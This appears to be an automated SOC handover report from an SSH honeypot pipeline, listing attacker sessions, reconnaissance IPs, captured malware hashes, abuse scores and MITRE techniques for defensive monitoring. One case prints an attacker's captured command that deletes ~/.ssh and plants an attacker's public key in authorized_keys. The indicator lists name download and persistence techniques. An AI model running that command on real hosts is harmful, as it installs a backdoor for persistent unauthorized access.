- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-562561cf05c7

| Field | Detail |
|---|---|
| **Source IP** | `106.243.87[.]164` |
| **First Seen** | 2026-07-29 12:50 |
| **Last Seen** | 2026-07-29 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:50:47` | `cowrie.session.connect` |
| `2026-07-29 12:50:47` | `cowrie.client.version` |
| `2026-07-29 12:50:47` | `cowrie.client.kex` |
| `2026-07-29 12:50:48` | `cowrie.login.success` |
| `2026-07-29 12:50:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.243.87[.]164` to AbuseIPDB if not already reported
- [ ] Block `106.243.87[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9532966669a

| Field | Detail |
|---|---|
| **Source IP** | `157.20.228[.]20` |
| **First Seen** | 2026-07-29 12:52 |
| **Last Seen** | 2026-07-29 12:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:52:13` | `cowrie.session.connect` |
| `2026-07-29 12:52:13` | `cowrie.client.version` |
| `2026-07-29 12:52:13` | `cowrie.client.kex` |
| `2026-07-29 12:52:15` | `cowrie.login.success` |
| `2026-07-29 12:52:16` | `cowrie.direct-tcpip.request` |
| `2026-07-29 12:52:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.20.228[.]20` to AbuseIPDB if not already reported
- [ ] Block `157.20.228[.]20` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eff2f8d71c1a

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-07-29 12:52 |
| **Last Seen** | 2026-07-29 12:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:52:26` | `cowrie.session.connect` |
| `2026-07-29 12:52:26` | `cowrie.client.version` |
| `2026-07-29 12:52:26` | `cowrie.client.kex` |
| `2026-07-29 12:52:28` | `cowrie.login.success` |
| `2026-07-29 12:52:28` | `cowrie.direct-tcpip.request` |
| `2026-07-29 12:52:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f2f42bf00b9

| Field | Detail |
|---|---|
| **Source IP** | `134.112.56[.]47` |
| **First Seen** | 2026-07-29 12:53 |
| **Last Seen** | 2026-07-29 12:53 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:53:17` | `cowrie.session.connect` |
| `2026-07-29 12:53:17` | `cowrie.client.version` |
| `2026-07-29 12:53:18` | `cowrie.client.kex` |
| `2026-07-29 12:53:18` | `cowrie.login.success` |
| `2026-07-29 12:53:19` | `cowrie.session.params` |
| `2026-07-29 12:53:19` | `cowrie.command.input` |
| `2026-07-29 12:53:19` | `cowrie.command.failed` |
| `2026-07-29 12:53:19` | `cowrie.log.closed` |
| `2026-07-29 12:53:20` | `cowrie.session.params` |
| `2026-07-29 12:53:20` | `cowrie.command.input` |
| `2026-07-29 12:53:20` | `cowrie.session.file_download` |
| `2026-07-29 12:53:20` | `cowrie.log.closed` |
| `2026-07-29 12:53:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.112.56[.]47` to AbuseIPDB if not already reported
- [ ] Block `134.112.56[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd0f5b2f7b11

| Field | Detail |
|---|---|
| **Source IP** | `134.112.56[.]47` |
| **First Seen** | 2026-07-29 12:53 |
| **Last Seen** | 2026-07-29 12:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:53:34` | `cowrie.session.connect` |
| `2026-07-29 12:53:34` | `cowrie.client.version` |
| `2026-07-29 12:53:34` | `cowrie.client.kex` |
| `2026-07-29 12:53:34` | `cowrie.login.success` |
| `2026-07-29 12:53:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.112.56[.]47` to AbuseIPDB if not already reported
- [ ] Block `134.112.56[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `91.233.83[.]203` | **60** | 2026-07-29 08:55 | 2026-07-29 12:53 | 47m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-07-29 09:08 | 2026-07-29 12:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]121` | **6** | 2026-07-29 11:22 | 2026-07-29 11:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]154` | **6** | 2026-07-29 09:05 | 2026-07-29 09:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **5** | 2026-07-29 09:00 | 2026-07-29 12:31 | 3m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | **3** | 2026-07-29 09:15 | 2026-07-29 10:20 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `88.214.25[.]125` | **3** | 2026-07-29 12:44 | 2026-07-29 12:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]94` | **3** | 2026-07-29 10:15 | 2026-07-29 10:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-29 09:35 | 2026-07-29 09:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.64.104[.]177` | **2** | 2026-07-29 12:09 | 2026-07-29 12:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]18` | **2** | 2026-07-29 11:36 | 2026-07-29 11:36 | 0m | 1 | `T1110.001` | 🟢 LOW |
| `120.240.95[.]27` | 1 | 2026-07-29 12:24 | 2026-07-29 12:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.166.252[.]192` | 1 | 2026-07-29 11:55 | 2026-07-29 11:56 | 13s | 0 | `T1592` | 🟢 LOW |
| `130.185.96[.]113` | 1 | 2026-07-29 10:15 | 2026-07-29 10:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.113[.]42` | 1 | 2026-07-29 12:24 | 2026-07-29 12:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `166.62.102[.]109` | 1 | 2026-07-29 11:28 | 2026-07-29 11:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `173.255.221[.]189` | 1 | 2026-07-29 09:37 | 2026-07-29 09:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]123` | 1 | 2026-07-29 08:55 | 2026-07-29 08:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | 1 | 2026-07-29 10:45 | 2026-07-29 10:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `196.204.71[.]189` | 1 | 2026-07-29 12:50 | 2026-07-29 12:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `197.156.97[.]198` | 1 | 2026-07-29 12:25 | 2026-07-29 12:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]26` | 1 | 2026-07-29 10:23 | 2026-07-29 10:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.205.18[.]52` | 1 | 2026-07-29 10:44 | 2026-07-29 10:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]111` | 1 | 2026-07-29 09:38 | 2026-07-29 09:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.149[.]205` | 1 | 2026-07-29 11:52 | 2026-07-29 11:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.129.176[.]135` | 1 | 2026-07-29 11:26 | 2026-07-29 11:27 | 13s | 0 | `T1592` | 🟢 LOW |
| `61.185.30[.]170` | 1 | 2026-07-29 12:25 | 2026-07-29 12:26 | 22s | 0 | `T1592` | 🟢 LOW |
| `61.191.103[.]17` | 1 | 2026-07-29 11:55 | 2026-07-29 11:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]222` | 1 | 2026-07-29 10:35 | 2026-07-29 10:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]121` | 1 | 2026-07-29 10:53 | 2026-07-29 10:53 | 16s | 0 | `T1592` | 🟢 LOW |
| `74.82.47[.]3` | 1 | 2026-07-29 10:34 | 2026-07-29 10:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-07-29 09:23 | 2026-07-29 09:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.25.5[.]164` | 1 | 2026-07-29 10:33 | 2026-07-29 10:33 | 14s | 0 | `T1592` | 🟢 LOW |
| `78.66.45[.]101` | 1 | 2026-07-29 11:26 | 2026-07-29 11:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]14` | 1 | 2026-07-29 12:44 | 2026-07-29 12:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]18` | 1 | 2026-07-29 09:45 | 2026-07-29 09:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]46` | 1 | 2026-07-29 12:29 | 2026-07-29 12:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]55` | 1 | 2026-07-29 09:42 | 2026-07-29 09:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.5.66[.]49` | 1 | 2026-07-29 10:47 | 2026-07-29 10:47 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/73 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **32/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/74** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `417e065ee49c19c83c0e9cd99b702efde39d77b6c02d56b69a6c56b93d275ff3` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `417e065ee49c19c8...` | 47/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `180.180.232[.]242` | TH | TOT Public Company Limited | **100** ⚠️ | 1 |
| `223.210.27[.]53` | CN | BeiJing Guoxin bilin Telecom Technology Co.,Ltd | **100** ⚠️ | 50 |
| `218.4.156[.]254` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `122.160.59[.]87` | IN | ABTS DELHI, | **100** ⚠️ | 50 |
| `36.64.211[.]93` | ID | PT TELKOM INDONESIA Menara Multimedia Lt.7 Jl. Kebon sirih No.12 JAKARTA | **100** ⚠️ | 50 |
| `113.140.95[.]2` | CN | CHINANET SHAANXI PROVINCE NETWORK | **100** ⚠️ | 50 |
| `188.219.104[.]210` | IT | Vodafone Italia S.p.A. | **100** ⚠️ | 50 |
| `166.62.102[.]109` | US | GoDaddy.com, LLC | **100** ⚠️ | 23 |
| `220.163.252[.]244` | CN | CHINANET yunnan province network | **100** ⚠️ | 50 |
| `182.75.197[.]174` | IN | Devbhumi Broadcast Pvt Ltd | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 153 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 139 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 23 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 21 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 21 |

---

## 🔕 False Positive Summary (40 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 22 below threshold 25 | 3 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 29 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 308 cases |
| Tool 34  | Credential Extractor        | ✅ 172 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 144 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 40 filtered (13.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 90 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 139 priority case(s) shown individually · 39 recon entry/entries in table (11 group(s) consolidating 101 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-29T14:19:50Z_
